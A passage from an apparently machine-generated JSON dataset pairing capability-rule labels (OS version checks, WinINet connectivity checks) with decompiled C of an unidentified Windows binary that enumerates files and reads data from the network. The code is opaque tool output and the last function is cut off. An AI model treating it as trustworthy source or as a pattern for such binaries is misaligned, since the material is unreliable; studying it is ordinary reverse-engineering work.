        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040dac0(uint *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_38h;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStackY8076 [20];\n    uint32_t uStackY8056;\n    uint32_t var_1f6ch_2;\n    uint var_1f74h;\n    uint var_1f5ch;\n    uint32_t var_1f58h;\n    uint var_1f50h_2;\n    uint var_1f5ch_2;\n    uint var_1f58h_2;\n    uint var_1f50h_3;\n    uint var_1fcch;\n    uint var_1fc8h;\n    uint var_1fc4h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1f90h;\n    uint var_1f88h;\n    uint var_1f6ch;\n    uint var_1f50h;\n    uint var_bc8h_2;\n    uint var_bc8h_3;\n    uint var_bc8h;\n    uint var_7e0h_2;\n    uint var_7e0h_3;\n    uint var_7e0h;\n    uint var_3f8h_2;\n    uint var_3f8h_3;\n    uint var_3f8h;\n    uint uStackY164;\n    uint arg_8h_00;\n    uint noname_1_00;\n    uint noname_2_00;\n    uint32_t in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint arg_24h;\n    uint arg_28h;\n    uint in_stack_ffffff84;\n    uint *arg_30h;\n    uint *arg_34h;\n    uint noname_13_00;\n    uint arg_48h;\n    uint var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43d856;\n    var_ch_2 = *in_FS_OFFSET;\n    fcn.0042bc40();\n    *in_FS_OFFSET = &fcn.0040dac0::var_ch_2;\n    uVar2 = *noname_0;\n    uVar3 = noname_0[1];\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.00429c39();\n    fcn.00429c39();\n    iVar1 = (**0x462f14)();\n    if (iVar1 == 0) {\n        (**0x463038)();\n        (**0x463038)();\n    }\n    else {\n        (**0x462e8c)();\n        (**0x463038)();\n        (**0x463038)();\n    }\n    (**0x463038)();\n    fcn.0041fcd0(&stack0xffffe074);\n    var_4h_2 = 0;\n    fcn.0040beb0(&fcn.0040dac0::var_1f6ch_2);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 1);\n    arg_48h = 0x4452bc;\n    noname_13_00 = 0x446ee4;\n    arg_38h = fcn.0042d410();\n    arg_34h = &fcn.0040dac0::var_7e0h_2;\n    arg_30h = &fcn.0040dac0::var_3f8h_2;\n    noname_2_00 = 0xffffffff;\n    noname_1_00 = 0;\n    arg_28h = 0xf;\n    arg_24h = 0;\n    arg_8h_00 = 0x450078;\n    in_stack_ffffff6c = in_stack_ffffff6c & 0xffffff00;\n    uStackY164 = 0x40dcf4;\n    fcn.004061b0(0x450078, 0, 0xffffffff);\n    uStackY164 = 0x40dcf9;\n    uVar2 = fcn.00414a20(arg_8h_00, noname_1_00, noname_2_00, in_stack_ffffff6c, in_stack_ffffff70, in_stack_ffffff74, \n                         in_stack_ffffff78, arg_24h, arg_28h, in_stack_ffffff84, arg_30h, arg_34h, arg_38h, noname_13_00\n                         , uVar2, uVar3, arg_48h);\n    (**0x463038)();\n    if (0xf < var_1f58h) {\n        fcn.0042a679();\n    }\n    var_1f58h = 0xf;\n    var_1f5ch = 0;\n    var_1f6ch_2 = var_1f6ch_2 & 0xffffff00;\n    var_4h_2 = 0xffffffff;\n    if (0xf < uStackY8056) {\n        fcn.0042a679();\n    }\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    iVar1 = (**0x462f30)();\n    if (iVar1 < 5) {\n        iVar1 = (**0x462f30)();\n        *0x4524d0 = 1;\n        if (iVar1 != 2) {\n            *0x4524d0 = 0;\n        }\n    }\n    else {\n        uVar3 = fcn.0042ad20();\n        fcn.004062a0(&fcn.0040dac0::var_1f50h_2, uVar3);\n        fcn.0040c0b0();\n        *0x4524d0 = 1;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(uVar2);\n    return;\n}\n",
        "token_count": 1734
    },
    "0040e810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040e810(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t arg_20h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_c9ch;\n    uint var_c98h;\n    uint var_c94h;\n    int32_t var_c90h;\n    uint var_c8ch;\n    uint var_c88h;\n    uint var_c84h;\n    uint32_t var_c80h;\n    uint var_c70h;\n    uint32_t var_c6ch;\n    uint32_t var_c64h;\n    uint var_c54h;\n    uint32_t var_c50h;\n    uint32_t var_c48h;\n    uint var_c38h;\n    uint32_t var_c34h;\n    uint var_c2ch;\n    uint var_844h;\n    uint var_45ch;\n    uint var_74h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43d981;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_c8ch = arg_14h;\n    var_c88h = arg_1ch;\n    var_c94h = arg_20h;\n    fcn.0042a6e0(&var_c2ch, 0, 1000, var_10h);\n    fcn.0042a6e0(&var_45ch, 0, 1000);\n    fcn.0042a6e0(&var_844h, 0, 1000);\n    (**0x463038)(&var_c2ch, 0x44701c);\n    (**0x463038)(&var_c2ch, arg_8h);\n    (**0x463038)(&var_c2ch, 0x447014);\n    var_c84h = fcn.004284d0(0, 1000000, 0);\n    var_c90h = 0;\n    uVar3 = fcn.00420a40(0x1a);\n    uVar3 = fcn.00420830(arg_10h, 0x447008, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    uVar3 = fcn.00420a40(0x1c);\n    uVar3 = fcn.00420830(&var_45ch, 0x446ff8, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    uVar3 = fcn.00420a40(0x28);\n    uVar3 = fcn.00420830(&var_45ch, 0x446fe8, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    uVar3 = fcn.0041f1c0();\n    var_c34h = 0xf;\n    var_c38h = 0;\n    var_c48h = var_c48h & 0xffffff00;\n    uVar4 = fcn.0042ad20(uVar3);\n    fcn.004062a0(uVar3, uVar4);\n    var_4h = 0;\n    uVar3 = fcn.00406490(&var_c64h, 0x446fdc, &var_c48h);\n    var_4h._0_1_ = 1;\n    puVar5 = fcn.0040e6f0(&var_c80h, uVar3, 0x446fd0);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    if (0xf < puVar5[5]) {\n        puVar5 = *puVar5;\n    }\n    uVar3 = fcn.00420830(&var_45ch, 0x446fc4, puVar5);\n    (**0x4630e4)(&var_45ch, uVar3);\n    if (0xf < var_c6ch) {\n        fcn.0042a679(var_c80h);\n    }\n    var_c6ch = 0xf;\n    var_c70h = 0;\n    var_c80h = var_c80h & 0xffffff00;\n    if (0xf < var_c50h) {\n        fcn.0042a679(var_c64h);\n    }\n    var_c50h = 0xf;\n    var_c54h = 0;\n    var_c64h = var_c64h & 0xffffff00;\n    var_4h = 0xffffffff;\n    if (0xf < var_c34h) {\n        fcn.0042a679(var_c48h);\n    }\n    var_c34h = 0xf;\n    var_c38h = 0;\n    var_c48h = var_c48h & 0xffffff00;\n    uVar3 = fcn.00420a40(5);\n    uVar3 = fcn.00420830(&var_45ch, 0x446fb8, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    uVar3 = fcn.00420a40(0x26);\n    uVar3 = fcn.00420830(&var_45ch, 0x446fa8, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    uVar3 = fcn.00420a40(0x2a);\n    uVar3 = fcn.00420830(&var_45ch, 0x446f94, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    uVar3 = fcn.00420a40(8);\n    uVar3 = fcn.00420830(&var_45ch, 0x446f88, uVar3);\n    (**0x4630e4)(&var_45ch, uVar3);\n    iVar6 = (**0x462fa8)(&var_45ch, 0x446f78, 0);\n    arg_20h_00 = iVar6 != 0;\n    uVar3 = 0x446f64;\n    iVar6 = (**0x462fa8)(&var_45ch, 0x446f64, 0);\n    if (iVar6 != 0) {\n        arg_20h_00 = 1;\n        var_c90h = 1;\n    }\n    iVar6 = (**0x462fa8)(arg_10h, 0x446f58, 0);\n    uVar4 = var_c84h;\n    if (arg_20h_00 == 0) {\n        fcn.0040d960(var_c8ch, &var_45ch, var_c84h, arg_18h, arg_ch, var_c88h, 0, iVar6 != 0, 0, arg_24h);\n    }\n    else {\n        (**0x462fcc)(100, &var_74h);\n        puVar5 = &var_74h;\n        uVar4 = var_c84h;\n        while (var_c84h = uVar4,  var_74h != '\\0') {\n            iVar7 = (**0x462f10)(puVar5);\n            if ((var_c90h == 0) || (iVar7 != 2)) {\n                (**0x4630e4)(&var_844h, &var_45ch);\n                uVar4 = fcn.00420830(&var_844h, 0x446f34, puVar5);\n            }\n            else {\n                (**0x4630e4)(&var_844h, &var_45ch);\n                uVar4 = fcn.00420830(&var_844h, 0x446f44, puVar5);\n            }\n            (**0x4630e4)(&var_844h, uVar4);\n            fcn.0040d960(var_c8ch, &var_844h, var_c84h, arg_18h, arg_ch, var_c88h, arg_20h_00, iVar6 != 0, 0, arg_24h);\n            iVar7 = (**0x462f30)(puVar5);\n            pcVar1 = puVar5 + iVar7 + 1;\n            puVar5 = puVar5 + iVar7 + 1;\n            uVar4 = var_c84h;\n            var_74h._0_1_ = *pcVar1;\n        }\n    }\n    fcn.00429a60(uVar4, &var_c9ch, &var_c98h);\n    fcn.00429a10(var_c94h, &var_c2ch, var_c9ch, var_c98h);\n    cVar2 = fcn.00408c70(uVar4);\n    if (cVar2 == '\\0') {\n        fcn.00429af0(uVar4);\n    }\n    else {\n        fcn.0040b010(uVar4);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(uVar3);\n    return;\n}\n",
        "token_count": 2184
    },
    "0040fdf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040fdf0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint arg_44h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint *var_ch_2;\n    uint var_1ch_3;\n    uint32_t var_20h;\n    uint var_4h_2;\n    uint var_28h;\n    uint32_t var_3ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint uVar4;\n    uint noname_3_00;\n    uint32_t in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint arg_28h;\n    uint arg_2ch;\n    uint in_stack_ffffff68;\n    uint noname_11_00;\n    uint noname_12_00;\n    uint32_t in_stack_ffffff78;\n    uint32_t arg_40h;\n    uint var_50h_2;\n    uint var_4ch_2;\n    uint var_48h;\n    uint32_t var_34h;\n    uint var_58h;\n    uint *var_2ch_2;\n    uint var_1ch_2;\n    uint32_t var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h_3;\n    \n    uStack12 = 0x43dc68;\n    var_ch_3 = *in_FS_OFFSET;\n    var_10h_2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4ch_2 = noname_15;\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    var_50h_2 = 0;\n    var_4h_3._0_1_ = 2;\n    var_4h_3._1_3_ = 0;\n    arg_8h = 0;\n    arg_40h = in_stack_ffffff78 & 0xffffff00;\n    uVar1 = fcn.0042ad20();\n    noname_12_00 = 0x4452bc;\n    fcn.004062a0(0x4452bc, uVar1);\n    noname_11_00 = 1;\n    noname_3_00 = 0xffffffff;\n    uVar4 = 0;\n    puVar3 = &var_28h;\n    arg_2ch = 0xf;\n    arg_28h = 0;\n    var_4h_3._0_1_ = 3;\n    in_stack_ffffff50 = in_stack_ffffff50 & 0xffffff00;\n    fcn.004061b0(puVar3, 0, 0xffffffff);\n    var_4h_3._0_1_ = 2;\n    uVar1 = fcn.0040efb0(&var_48h, puVar3, uVar4, noname_3_00, in_stack_ffffff50, in_stack_ffffff54, in_stack_ffffff58, \n                         in_stack_ffffff5c, arg_28h, arg_2ch, in_stack_ffffff68, noname_11_00, noname_12_00, uVar1, \n                         arg_40h);\n    var_4h_3._0_1_ = 4;\n    fcn.004063e0(uVar1);\n    var_4h_3 = CONCAT31(var_4h_3._1_3_, 2);\n    if (0xf < var_34h) {\n        fcn.0042a679();\n    }\n    iVar2 = (**0x463068)();\n    if (iVar2 != 0) {\n        puVar3 = var_ch_2;\n        if (var_20h < 0x10) {\n            puVar3 = &var_ch_2;\n        }\n        iVar2 = fcn.0040b950(puVar3, 0, var_1ch_3);\n        if (iVar2 != -1) {\n            fcn.00405ac0(0, iVar2 + var_8h);\n            puVar3 = var_2ch_2;\n            if (var_18h_2 < 0x10) {\n                puVar3 = &var_2ch_2;\n            }\n            arg_8h = fcn.0042d26d(puVar3, var_4ch_2, &var_50h_2);\n        }\n        iVar2 = (**0x462f30)();\n        if (0 < iVar2) {\n            uVar4 = fcn.0042ad20();\n            goto code_r0x0040ff54;\n        }\n    }\n    uVar4 = fcn.0042ad20();\n    arg_8h = 0x447038;\ncode_r0x0040ff54:\n    fcn.004062a0(arg_8h, uVar4);\n    var_1ch_2 = 0;\n    puVar3 = var_2ch_2;\n    if (var_18h_2 < 0x10) {\n        puVar3 = &var_2ch_2;\n    }\n    *puVar3 = 0;\n    if (0xf < var_18h_2) {\n        fcn.0042a679();\n    }\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    if (0xf < var_20h) {\n        fcn.0042a679();\n    }\n    var_20h = 0xf;\n    var_1ch_3 = 0;\n    var_ch_2 = var_ch_2 & 0xffffff00;\n    if (0xf < var_3ch) {\n        fcn.0042a679();\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0042a75a(uVar1);\n    return;\n}\n",
        "token_count": 1836
    },
    "00414890": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414890(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar6;\n    uint var_420h;\n    uint var_41ch;\n    uint32_t var_418h;\n    int32_t var_414h;\n    uint var_410h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e308;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar6 = 0x44704c;\n    var_4h = 0;\n    var_418h = 1;\n    var_414h = 0;\n    var_10h = uVar1;\n    uVar2 = fcn.00414640(arg_8h);\n    iVar3 = (**0x463068)(uVar2, uVar6, uVar1);\n    if (iVar3 == 0) {\n        var_414h = 1;\n    }\n    uVar2 = (**0x463094)(0, 99999999);\n    iVar3 = (**0x46301c)(uVar2);\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    uVar2 = (**0x462f74)(puVar4, 0, 0, 0, 0);\n    var_41ch = 600000;\n    (**0x462e68)(uVar2, 2, &var_41ch, 4);\n    if (var_414h == 0) {\n        uVar6 = 0x4000100;\n    }\n    else {\n        uVar6 = 0x4800100;\n    }\n    arg_8h_00 = 0;\n    var_414h = (**0x462f78)(uVar2, arg_8h, 0, 0, uVar6, 0);\n    iVar5 = 0;\n    while (var_418h != 0) {\n        (**0x462f98)(var_414h, &var_410h, 0x400, &var_418h);\n        uVar1 = 0;\n        if (var_418h == 0) break;\n        do {\n            fcn.0042a840(iVar5 + iVar3, &var_410h + uVar1, 1);\n            uVar1 = uVar1 + 1;\n            iVar5 = iVar5 + 1;\n        } while (uVar1 < var_418h);\n    }\n    (**0x462f70)(var_414h);\n    (**0x462f70)(uVar2);\n    if (0xf < arg_20h) {\n        fcn.0042a679(arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 774
    },
    "00416bb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416bb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    ulong uVar4;\n    uint var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_554h;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    (**0x462e8c)(&var_414h, 0x446e98, arg_8h);\n    iVar1 = (**0x4630f8)(&var_414h, &var_554h);\n    if (iVar1 != -1) {\n        do {\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) + 1;\n            iVar2 = (**0x463068)(&var_528h, 0x446d4c);\n            if ((iVar2 != 0) && (iVar2 = (**0x463068)(&var_528h, 0x446d48),  iVar2 != 0)) {\n                fcn.0042a6e0(&var_310h, 0, 0x104);\n                fcn.0042a6e0(&var_108h, 0, 0x104);\n                (**0x463038)(&var_310h, arg_8h);\n                (**0x463038)(&var_310h, 0x445308);\n                (**0x463038)(&var_310h, &var_528h);\n                (**0x463038)(&var_108h, 0x445308);\n                uVar3 = *0x452308;\n                if (arg_18h != 0) {\n                    uVar3 = *0x451c0c;\n                }\n                (**0x463038)(&var_108h, uVar3);\n                (**0x463038)(&var_108h, 0x445308);\n                (**0x463038)(&var_108h, arg_ch);\n                (**0x463038)(&var_108h, 0x445308);\n                (**0x463038)(&var_108h, arg_10h);\n                (**0x463038)(&var_108h, 0x445308);\n                (**0x463038)(&var_108h, arg_14h);\n                if (arg_1ch == 1) {\n                    (**0x463038)(&var_108h, 0x445308);\n                    uVar3 = *0x452144;\ncode_r0x00416db7:\n                    (**0x463038)(&var_108h, uVar3);\n                }\n                else {\n                    if (arg_1ch == 2) {\n                        (**0x463038)(&var_108h, 0x445308);\n                        uVar3 = *0x451fa4;\n                        goto code_r0x00416db7;\n                    }\n                    if (arg_1ch == 3) {\n                        (**0x463038)(&var_108h, 0x445308);\n                        uVar3 = *0x451c54;\n                        goto code_r0x00416db7;\n                    }\n                }\n                (**0x463038)(&var_108h, 0x445308);\n                (**0x463038)(&var_108h, &var_528h);\n                fcn.0042a6e0(&var_20ch, 0, 0x104);\n                (**0x463038)(&var_20ch, *0x452154);\n                uVar3 = fcn.00420910(0x1a);\n                (**0x463038)(&var_20ch, uVar3);\n                (**0x462ee0)(&var_310h, &var_20ch, 1);\n                uVar4 = fcn.004209e0(&var_20ch);\n                uVar3 = fcn.0042d350(uVar4, 1000, 0);\n                fcn.0040b600(uVar3);\n                iVar2 = (**0x463068)(arg_ch, *0x452328);\n                if (iVar2 == 0) {\n                    fcn.0040b8c0();\n                }\n                iVar2 = (**0x463068)(arg_ch, *0x452338);\n                if (iVar2 == 0) {\n                    fcn.0040b8c0();\n                }\n                fcn.004299c0(*(in_ECX + 0x20), &var_108h, &var_20ch);\n                (**0x462f3c)(&var_20ch);\n            }\n            iVar2 = (**0x462f50)(iVar1, &var_554h);\n        } while (iVar2 != 0);\n        (**0x462ec0)(iVar1);\n    }\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1205
    },
    "00416f10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_974h\n\nvoid __cdecl\nfcn.00416f10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, int32_t arg_20h, \n            int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint uVar3;\n    uint var_974h;\n    uint var_970h;\n    uint var_96ch;\n    uint var_965h;\n    uint var_938h;\n    uint var_824h;\n    uint var_720h;\n    uint var_61ch;\n    uint var_518h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    (**0x462e8c)(&var_824h, 0x4473b0, arg_10h);\n    if (arg_1ch == 0) {\n        iVar1 = (**0x4630f8)(&var_824h, &var_965h + 1);\n        if (iVar1 != -1) {\n            do {\n                iVar2 = (**0x463068)(&var_938h, 0x446d4c);\n                if ((iVar2 != 0) && (iVar2 = (**0x463068)(&var_938h, 0x446d48),  iVar2 != 0)) {\n                    fcn.0042a6e0(&var_108h, 0, 0x104);\n                    (**0x463038)(&var_108h, &var_938h);\n                    (**0x462e8c)(&var_414h, 0x447148, arg_10h, &var_108h, *0x452144, arg_8h);\n                    (**0x462e8c)(&var_720h, 0x446d50, &var_414h, *0x451b54);\n                    (**0x462e8c)(&var_20ch, 0x447148, arg_10h, &var_108h, *0x451fa4, arg_8h);\n                    (**0x462e8c)(&var_61ch, 0x446d50, &var_20ch, *0x451b54);\n                    (**0x462e8c)(&var_310h, 0x44737c, arg_10h, &var_108h, *0x451c54, arg_8h);\n                    (**0x462e8c)(&var_518h, 0x446d50, &var_310h, *0x451b54);\n                    if ((arg_20h != 0) && (iVar2 = fcn.004209b0(&var_720h),  iVar2 != 0)) {\n                        unaff_EDI = arg_18h;\n                        fcn.00416bb0(&var_414h, arg_ch, arg_14h, &var_108h, arg_18h, 1);\n                    }\n                    if ((arg_24h != 0) && (iVar2 = fcn.004209b0(&var_61ch),  iVar2 != 0)) {\n                        fcn.00416bb0(&var_20ch, arg_ch, arg_14h, &var_108h, arg_18h, 2);\n                    }\n                    if ((arg_28h != 0) && (iVar2 = fcn.004209b0(&var_518h),  iVar2 != 0)) {\n                        fcn.00416bb0(&var_310h, arg_ch, arg_14h, &var_108h, arg_18h, 3);\n                    }\n                    fcn.0042a6e0(&var_414h, 0, 0x104);\n                    fcn.0042a6e0(&var_720h, 0, 0x104);\n                    fcn.0042a6e0(&var_20ch, 0, 0x104);\n                    fcn.0042a6e0(&var_61ch, 0, 0x104);\n                    fcn.0042a6e0(&var_310h, 0, 0x104);\n                    fcn.0042a6e0(&var_518h, 0, 0x104);\n                }\n                iVar2 = (**0x462f50)(iVar1, &var_965h + 1);\n            } while (iVar2 != 0);\n            (**0x462ec0)(iVar1);\n            fcn.0042a75a(unaff_EDI);\n            return;\n        }\n        goto code_r0x00417483;\n    }\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    if (arg_1ch == 1) {\n        uVar3 = 0x447348;\ncode_r0x00417277:\n        (**0x463038)(&var_108h, uVar3);\n    }\n    else {\n        if (arg_1ch == 2) {\n            uVar3 = 0x447358;\n            goto code_r0x00417277;\n        }\n        if (arg_1ch == 3) {\n            uVar3 = 0x447368;\n            goto code_r0x00417277;\n        }\n    }\n    (**0x462e8c)(&var_310h, 0x447148, arg_10h, &var_108h, *0x452144, arg_8h);\n    (**0x462e8c)(&var_518h, 0x446d50, &var_310h, *0x451b54);\n    (**0x462e8c)(&var_20ch, 0x447148, arg_10h, &var_108h, *0x451fa4, arg_8h);\n    (**0x462e8c)(&var_61ch, 0x446d50, &var_20ch, *0x451b54);\n    (**0x462e8c)(&var_414h, 0x44737c, arg_10h, &var_108h, *0x451c54, arg_8h);\n    (**0x462e8c)(&var_720h, 0x446d50, &var_414h, *0x451b54);\n    if ((arg_20h != 0) && (iVar1 = fcn.004209b0(&var_518h),  iVar1 != 0)) {\n        fcn.00416bb0(&var_310h, arg_ch, arg_14h, &var_108h, arg_18h, 1);\n    }\n    if ((arg_24h != 0) && (iVar1 = fcn.004209b0(&var_61ch),  iVar1 != 0)) {\n        fcn.00416bb0(&var_20ch, arg_ch, arg_14h, &var_108h, arg_18h, 2);\n    }\n    if ((arg_28h != 0) && (iVar1 = fcn.004209b0(&var_720h),  iVar1 != 0)) {\n        fcn.00416bb0(&var_414h, arg_ch, arg_14h, &var_108h, arg_18h, 3);\n    }\n    fcn.0042a6e0(&var_310h, 0, 0x104);\n    fcn.0042a6e0(&var_518h, 0, 0x104);\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    fcn.0042a6e0(&var_61ch, 0, 0x104);\n    fcn.0042a6e0(&var_414h, 0, 0x104);\n    fcn.0042a6e0(&var_720h, 0, 0x104);\ncode_r0x00417483:\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1908
    },
    "00417d80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00417d80(uint *arg_8h)\n\n{\n    uint unaff_EBP;\n    uint var_138ch;\n    uint uStackY68;\n    uint *puStackY64;\n    uint uStackY60;\n    uint *puStackY56;\n    uint uStackY52;\n    uint *puStackY48;\n    uint *puStackY44;\n    uint *puStackY40;\n    uint *puStackY36;\n    uint *puStackY32;\n    uint *puStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    uint *puStackY16;\n    uint uStackY12;\n    uint var_4h;\n    \n    var_4h = 0x417d8d;\n    fcn.0042bc40();\n    if (arg_8h != NULL) {\n        uStackY12 = 0xffff;\n        puStackY16 = 0x4525e0;\n        uStackY20 = 0x447794;\n        puStackY24 = 0x417db8;\n        (**0x462f08)();\n        puStackY24 = 0x1388;\n        puStackY32 = &fcn.00417d80::var_138ch;\n        puStackY28 = NULL;\n        puStackY36 = 0x417dcb;\n        fcn.0042a6e0();\n        puStackY24 = 0x4525e0;\n        puStackY28 = &fcn.00417d80::var_138ch;\n        puStackY32 = 0x417de0;\n        (**0x463038)();\n        puStackY32 = 0x447034;\n        puStackY36 = 